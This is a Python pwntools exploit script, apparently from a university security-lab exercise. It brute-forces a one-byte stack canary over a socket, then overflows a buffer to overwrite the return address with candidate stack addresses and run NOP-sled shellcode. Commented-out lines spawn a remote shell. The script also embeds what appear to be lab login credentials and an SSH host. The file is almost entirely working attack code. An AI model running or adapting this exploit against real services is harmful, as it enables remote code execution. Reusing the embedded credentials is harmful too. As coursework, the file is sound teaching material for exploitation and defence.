#!virtualenv/bin/python2

"""Imports"""
from getpass import getpass
from pwn import *

""" Global variables """
#VARIABLE = "test"
ssh_conn = None
STR_PREFIX = 'inetsec028:aezuthah:'
TIMEOUT = 3
MAX_BUF = 4095
PORT = 2000

TEST = True
GUESS_CANARY = False

def get_tube():
    if(ssh_conn):
        return ssh_conn.connect_remote('10.10.1.2', PORT)
    else:
        return remote('localhost', PORT)

def check_canary(char):
    with get_tube() as r:
        str = STR_PREFIX + 'X' * 400 + char

        r.send(str)

        output = None
        try:
            output = r.recvline(keepends=False, timeout=TIMEOUT)
        except EOFError:
            pass

        if output:
            print(output)

        return not output or not re.match('STACK SMASHING DETECTED', output)

def guess_canary():
    canary = None

    for i in range(0, 255, 1):
    # for i in [ord('x')]:
        print("Testing canary 0x%02x" % i)
        if check_canary(chr(i)):
            canary = i
            break
        # time.sleep(0.01)

    if canary:
        print("canary is 0x%02x" % canary)
    else:
        print("Canary not found (something went wrong)")

    return canary

def check_address(canary, address):
    with get_tube() as r:

        # address = 0xffffcc01

        str = STR_PREFIX + 'A' * 400 + chr(canary) + cyclic(12,n=1) + p32(address) + '\0'

        test = "!! RIGHT ADDRESS FOUND !!"

        # Shellcode
        # sh = asm(shellcraft.sh())
        # sh = asm(shellcraft.mov('ebp',5) + shellcraft.echo("Ich kann etwas hinausschreiben!!!"))
        sh = asm(shellcraft.findpeer() + shellcraft.mov('ebp', 'esi') + shellcraft.echo(test + "\n"))
        # sh = asm(shellcraft.findpeersh())
        nop = asm(shellcraft.nop()) * (MAX_BUF - len(str) - len(sh))

        str += nop + sh

        r.send(str)

        output = None
        try:
            output = r.recvline(keepends=False, timeout=TIMEOUT)
        except EOFError:
            pass

        if output:
            print(output)

        return output and re.match(test, output)


def guess_address(canary):
    address = None

    # for i in range(0, 255, 1):
    for i in [0xffffac01, 0xffffcc01]:
    # for i in [0xffffcc01]:
        print("Testing address 0x%08x" % i)
        if check_address(canary, i):
            address = i
            break
        # time.sleep(0.01)

    if address:
        print("address is 0x%08x" % address)
    else:
        print("Address not found (something went wrong)")

    return canary

def main(argv):
    """ Main entry point for the script """
    global ssh_conn

    context(arch = 'i386', os = 'linux')

    """ Setup the ssh connection """
    if not TEST:
        ssh_conn = ssh(host='secenv.seclab.tuwien.ac.at', user='inetsec028', port=10001)

    # We now know the canary: 0x22
    if GUESS_CANARY:
        canary = guess_canary()
    else:
        if TEST:
            canary = ord('i'); # Test canary
        else:
            canary = 0x22

    guess_address(canary)

if __name__ == '__main__':
    sys.exit(main(sys.argv))